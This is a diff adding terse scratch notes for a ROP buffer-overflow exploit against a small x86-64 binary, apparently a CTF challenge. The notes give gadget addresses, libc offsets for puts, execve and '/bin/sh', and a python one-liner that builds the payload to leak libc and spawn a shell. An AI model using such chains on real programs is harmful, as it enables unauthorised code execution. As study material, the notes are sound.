@@ -1,0 +1,55 @@
+execve("/bin/sh",0,0)
+
+rax
+rdi - 0x00000000004006d3 : pop rdi ; ret
+rsi - 0x00000000004006d1 : pop rsi ; pop r15 ; ret
+rdx
+
+0x00000000004006b9 : call qword ptr [r12 + rbx*8]
+
+mov rax
+mov rdi
+mov rsi
+mov rdx
+
+- push rsp
+- 
+
+
+7f8a8e032000-7f8a8e40a000 r-xp 00000000 08:02 50200906                   /usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0
+
+0x000000000040063a - main puts
+0x000000000040066b - main leave
+\x6b\x06\x40\x00\x00\x00\x00\x00
+\xd1\x06\x40\x00\x00x\x00\x00\x00
+
+test:
+'a'*SOME_VAL+
+\xd3\x06\x40\x00\x00\x00\x00\x00+
+\x18\x10\x60\x00\x00\x00\x00\x00+
+\xe0\x04\x40\x00\x00\x00\x00\x00
+\x26\x06\x40\x00\x00\x00\x00\x00
+
+\xd3\x06\x40\x00\x00\x00\x00\x00\x18\x10\x60\x00\x00\x00\x00\x00\x3a\x06\x40\x00\x00\x00\x00\x00
+
+python -c "print('a'*0x48+'\xd3\x06\x40\x00\x00\x00\x00\x00\x18\x10\x60\x00\x00\x00\x00\x00\xe0\x04\x40\x00\x00\x00\x00\x00\x26\x06\x40\x00\x00\x00\x00\x00')"
+
+
+
+
+0x7ffff78c1e30 = execve
+0x7ffff785d9c0 = puts
+0x7ffff7990e9a = /bin/sh
+
+
+0x7ffff7a7c690 - puts
+0x7ffff7ad9770 - execve - 0x5d0e0
+0x7ffff7b99d57 - /bin/sh - 0x11d6c7
+
+0x7ffff7b99d93 - %s%s%s 
+^^^^
+Helps adjusting the /bin/sh address
+
+
+
+
